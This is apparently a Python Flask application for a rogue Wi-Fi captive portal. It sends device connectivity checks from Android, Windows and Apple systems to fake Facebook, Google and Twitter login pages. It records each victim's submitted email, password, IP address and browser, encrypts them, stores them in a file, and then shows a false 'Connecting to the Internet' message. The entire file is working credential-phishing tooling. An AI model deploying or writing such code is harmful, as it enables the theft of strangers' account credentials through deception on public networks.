"""
Captive Portal Flask Web Application.

Serves login pages and captures submitted credentials, encrypting them
using a Fernet key loaded from configuration. Also handles common captive
portal detection URLs. Uses centralized structured logging.
"""
import os
import json
import sys
import logging
import logging.config
import time
import uuid # For request IDs
from flask import Flask, request, render_template, redirect, url_for, abort, g
from cryptography.fernet import Fernet, InvalidToken
from datetime import datetime

# --- Logging Setup ---
try:
    # Ensure logging_config is importable from the script's directory or parent
    script_dir = os.path.dirname(__file__)
    parent_dir = os.path.dirname(script_dir)
    # Add parent directory (where logging_config.py is) to path
    if parent_dir not in sys.path:
         sys.path.insert(0, parent_dir)

    from logging_config import LOGGING_CONFIG
    logging.config.dictConfig(LOGGING_CONFIG)
    # Get the main application logger instance (can share with main.py or use a dedicated one)
    # Using 'wifi_portal' logger as defined in logging_config.py
    logger = logging.getLogger('wifi_portal')
    logger.info("Portal logging configured successfully using logging_config.")
except ImportError as ie:
    # Fallback basic config if import fails
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - [PORTAL_FALLBACK] %(message)s')
    logger = logging.getLogger('wifi_portal_portal_fallback')
    logger.error(f"Failed to import logging_config: {ie}. Using basic fallback logging.")
except Exception as e:
    # Catch other potential errors during logging setup
    logging.basicConfig(level=logging.ERROR, format='%(asctime)s - %(name)s - %(levelname)s - [PORTAL_FALLBACK_ERROR] %(message)s')
    logger = logging.getLogger('wifi_portal_portal_error')
    logger.error(f"CRITICAL ERROR setting up portal logging: {e}", exc_info=True)
# --- ---


# --- Constants ---
CONFIG_FILENAME = 'config.json'
LOG_DIR_NAME = 'login_details' # Used for credential file path construction
CRED_FILENAME = 'captured_credentials.enc'
TEMPLATE_MAP = {
    'facebook': 'login_facebook.html',
    'google': 'login_google.html',
    'twitter': 'login_twitter.html'
}
# --- ---

def create_app():
    """Creates and configures the Flask application instance."""
    app = Flask(__name__)
    # Flask's default logger is configured via dictConfig now (werkzeug logger)
    # app.logger is still available but might not use our handlers unless explicitly configured.
    # It's generally better to use the named logger obtained above.

    # --- Configuration Loading ---
    script_dir = os.path.dirname(__file__)
    # Config file is expected in the parent directory relative to this script (portal/../config.json)
    config_path = os.path.join(script_dir, '..', CONFIG_FILENAME)
    log_dir = os.path.join(script_dir, '..', LOG_DIR_NAME)
    cred_file_path = os.path.join(log_dir, CRED_FILENAME)

    logger.info(f"Loading configuration from: {config_path}")
    config = None
    if not os.path.exists(config_path):
        logger.critical(f"Configuration file not found: {config_path}. Portal cannot start.")
        sys.exit(1) # Exit if config is essential
    try:
        with open(config_path, 'r', encoding='utf-8') as f:
            config = json.load(f)
        logger.info("Configuration loaded.")
        # Avoid logging sensitive keys
        loggable_config = {k: v for k, v in config.items() if k not in ['fernet_key', 'wifi_password']}
        logger.debug(f"Portal loaded configuration (sensitive fields omitted): {json.dumps(loggable_config)}")
    except json.JSONDecodeError as e:
        logger.critical(f"Error decoding configuration file {config_path}: {e}. Portal cannot start.", exc_info=True)
        sys.exit(1)
    except Exception as e:
        logger.critical(f"Unexpected error loading configuration: {e}. Portal cannot start.", exc_info=True)
        sys.exit(1)

    # --- Fernet Key Setup ---
    logger.warning("SECURITY WARNING: Loading Fernet key from config file. This is insecure for production environments.")
    try:
        fernet_key = config['fernet_key'].encode('utf-8')
        app.config['FERNET'] = Fernet(fernet_key)
        logger.info("Fernet instance created successfully.")
    except KeyError:
        logger.critical("Configuration file is missing the 'fernet_key'. Portal cannot encrypt credentials.")
        sys.exit(1)
    except (ValueError, TypeError) as e:
         logger.critical(f"Invalid Fernet key format in configuration: {e}. Key must be 32 url-safe base64-encoded bytes.", exc_info=True)
         sys.exit(1)
    except Exception as e:
        logger.critical(f"Failed to initialize Fernet instance: {e}", exc_info=True)
        sys.exit(1)

    # --- Credential File Setup ---
    app.config['CRED_FILE_PATH'] = cred_file_path
    try:
        # Ensure the directory exists where credentials will be saved
        os.makedirs(log_dir, exist_ok=True)
        logger.info(f"Ensured credential directory exists: {log_dir}")
    except OSError as e:
        logger.error(f"Could not create credential directory {log_dir}: {e}. Credential saving will fail.", exc_info=True)
        # Decide if this is fatal. App might still run but fail on submission.

    return app

app = create_app()

# --- Request Hooks for Logging ---

@app.before_request
def log_request_info():
    """Log incoming request details before processing."""
    g.request_start_time = time.monotonic()
    g.request_id = str(uuid.uuid4()) # Generate unique ID for request tracing
    log_extras = {
        'request_id': g.request_id,
        'remote_addr': request.remote_addr,
        'method': request.method,
        'path': request.path,
        'user_agent': request.headers.get('User-Agent', 'Unknown')
    }
    logger.info(f"Request started: {request.method} {request.path}", extra=log_extras)
    logger.debug(f"Request Headers: {dict(request.headers)}", extra={'request_id': g.request_id})
    logger.debug(f"Request Cookies: {request.cookies}", extra={'request_id': g.request_id})


@app.after_request
def log_response_info(response):
    """Log outgoing response details after processing."""
    duration_ms = (time.monotonic() - g.request_start_time) * 1000 if hasattr(g, 'request_start_time') else -1
    log_extras = {
        'request_id': getattr(g, 'request_id', 'unknown'),
        'remote_addr': request.remote_addr,
        'method': request.method,
        'path': request.path,
        'status_code': response.status_code,
        'duration_ms': round(duration_ms, 2),
        'content_length': response.content_length,
        'mimetype': response.mimetype
    }
    logger.info(f"Request finished: {request.method} {request.path} - Status: {response.status_code}", extra=log_extras)
    # It's crucial to return the response object unchanged
    return response

# --- Routes ---

@app.route('/', methods=['GET'])
def index():
    """Displays the provider selection page."""
    req_id = getattr(g, 'request_id', 'unknown')
    logger.info("Serving provider selection page", extra={'request_id': req_id})
    return render_template('select_provider.html')

@app.route('/login/<provider>', methods=['GET'])
def login_provider(provider):
    """Displays the login page for the selected provider."""
    req_id = getattr(g, 'request_id', 'unknown')
    provider_lower = provider.lower()
    template = TEMPLATE_MAP.get(provider_lower)

    log_extras = {
        'request_id': req_id,
        'provider': provider
    }

    if not template:
        logger.warning(f"Invalid provider requested: '{provider}'", extra=log_extras)
        abort(404) # Use Flask's abort for standard error pages

    logger.info(f"Serving login page for provider: {provider.capitalize()}", extra=log_extras)
    return render_template(template)

@app.route('/submit/<provider>', methods=['POST'])
def submit_provider(provider):
    """Handles submitted credentials, encrypts, and saves them."""
    req_id = getattr(g, 'request_id', 'unknown')
    provider_lower = provider.lower()
    client_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    timestamp = datetime.now().isoformat()

    log_extras = {
        'request_id': req_id,
        'provider': provider,
        'client_ip': client_ip,
        'user_agent': user_agent
    }

    # Validate provider
    if provider_lower not in TEMPLATE_MAP:
        logger.warning(f"Invalid provider in submission URL: '{provider}'", extra=log_extras)
        abort(404)

    username = request.form.get('email') # Assumes 'email' field for username/email/phone
    password = request.form.get('pass')  # Assumes 'pass' field for password

    # Basic validation
    if not username or not password:
        logger.warning("Missing username or password in submission", extra=log_extras)
        return "<h3>Missing username or password. Please go back and try again.</h3>", 400

    # --- Email Format Validation ---
    # Simple check if the username field contains '@' if it's likely intended as an email
    # More robust validation could use regex or a library if needed
    # This check assumes the 'email' field might contain username, phone, or email
    # We only enforce '@' if it looks like an email attempt that failed basic HTML validation
    if '@' not in username and username.count('.') > 0: # Heuristic: if it has dots but no @, it might be a mistyped email
         # Check if the field name itself suggests email
         is_likely_email_field = 'email' in request.form # Check if the key is literally 'email'

         # More specific check: only reject if it looks like an email but lacks '@'
         # This avoids rejecting valid usernames or phone numbers entered in the field.
         # A better approach might be separate fields or clearer instructions on the form.
         # For now, we'll log a warning but allow it, relying on client-side type="email" mostly.
         logger.debug(f"Submitted username field '{username}' does not contain '@'. Allowing submission but noting potential non-email format.", extra=log_extras)
         # If strict validation is desired, uncomment the following:
         # logger.warning(f"Invalid email format submitted: missing '@'. Username: {username}", extra=log_extras)
         # return "<h3>Invalid email format. Please ensure you enter a valid email address.</h3>", 400
    # --- End Email Validation ---


    # Log submission attempt - MASK PASSWORD
    masked_password = '*' * len(password) if password else ''
    log_extras_submission = log_extras.copy()
    log_extras_submission['username'] = username
    # DO NOT log the actual password
    logger.info(f"Credential submission attempt received", extra=log_extras_submission)
    logger.debug(f"Raw form data (password masked): { {k: (v if k != 'pass' else masked_password) for k, v in request.form.items()} }", extra={'request_id': req_id})


    # Prepare data for encryption (including raw password temporarily)
    data_to_encrypt = {
        'timestamp': timestamp,
        'provider': provider,
        'client_ip': client_ip,
        'username': username,
        'password': password, # Include raw password ONLY for encryption payload
        'user_agent': user_agent
    }

    try:
        fernet_instance = app.config.get('FERNET')
        if not fernet_instance:
             logger.error("Fernet instance not available in app config during submission.", extra={'request_id': req_id})
             return "<h3>Internal server error processing request (Code: F1).</h3>", 500

        encrypted_data = fernet_instance.encrypt(json.dumps(data_to_encrypt).encode('utf-8'))
        cred_file_path = app.config.get('CRED_FILE_PATH')

        if not cred_file_path:
             logger.error("Credential file path not available in app config during submission.", extra={'request_id': req_id})
             return "<h3>Internal server error processing request (Code: F2).</h3>", 500

        # Append encrypted data to file
        with open(cred_file_path, 'ab') as f:
            f.write(encrypted_data + b'\n')

        # Log success - AVOID LOGGING PASSWORD again
        logger.info(f"Successfully captured and encrypted credentials", extra=log_extras_submission)

    except InvalidToken:
         logger.error("Fernet encryption failed (Invalid Token/Key?) during submission.", extra={'request_id': req_id}, exc_info=True)
         return "<h3>Internal server error processing request (Code: F3).</h3>", 500
    except OSError as e:
        logger.error(f"Error writing to credential file {cred_file_path}: {e}", extra={'request_id': req_id}, exc_info=True)
        return "<h3>Internal server error processing request (Code: F4).</h3>", 500
    except Exception as e:
        logger.error(f"Unexpected error encrypting/saving credentials: {e}", extra={'request_id': req_id}, exc_info=True)
        return "<h3>Internal server error processing request (Code: F5).</h3>", 500

    # Display a generic success message
    return "<h3>Thank you. Connecting to the Internet...</h3>"

# --- Captive Portal Detection Handling ---
# These routes are commonly hit by devices checking for internet connectivity.
# Redirect them to the main landing page.
@app.route('/generate_204') # Android
@app.route('/gen_204') # Android
@app.route('/connecttest.txt') # Windows
@app.route('/ncsi.txt') # Windows
@app.route('/hotspot-detect.html') # Apple iOS/macOS
@app.route('/library/test/success.html') # Apple macOS
@app.route('/success.txt') # Apple macOS
def handle_captive_portal_check():
    """Redirects captive portal checks to the landing page."""
    req_id = getattr(g, 'request_id', 'unknown')
    log_extras = {
        'request_id': req_id,
        'remote_addr': request.remote_addr,
        'path': request.path,
        'user_agent': request.headers.get('User-Agent', 'Unknown')
    }
    logger.info(f"Captive portal check detected, redirecting to index.", extra=log_extras)
    # Use Flask's redirect for cleaner handling
    return redirect(url_for('index'))


# --- Main Execution ---
if __name__ == '__main__':
    # Port 80 requires root/administrator privileges on most systems.
    # Consider using a higher port (e.g., 5000, 8080) for development/testing
    # or using a reverse proxy (like nginx) in a real deployment.
    HOST = '0.0.0.0'
    PORT = 80
    logger.info(f"Attempting to start Flask development server on host {HOST}, port {PORT}.")
    if PORT == 80 and os.name != 'nt' and os.geteuid() != 0:
         logger.warning("Running on port 80 requires root privileges on Linux/macOS.")
    elif PORT == 80 and os.name == 'nt':
         logger.warning("Running on port 80 may require administrator privileges on Windows.")

    try:
        # Set debug=False for security; Werkzeug provides request logging handled by our config
        app.run(host=HOST, port=PORT, debug=False)
    except PermissionError:
         logger.critical(f"Permission denied to bind to {HOST}:{PORT}. Try running with sudo/administrator or use a higher port (>1024).")
         sys.exit(1)
    except OSError as e:
         if "address already in use" in str(e).lower():
             logger.critical(f"Port {PORT} is already in use. Check for other running services.")
         else:
             logger.critical(f"Failed to start Flask server due to OS error: {e}", exc_info=True)
         sys.exit(1)
    except Exception as e:
        logger.critical(f"An unexpected error occurred starting the Flask server: {e}", exc_info=True)
        sys.exit(1)

    logger.info("Flask server shutdown.") # This line might not be reached if run stops abruptly
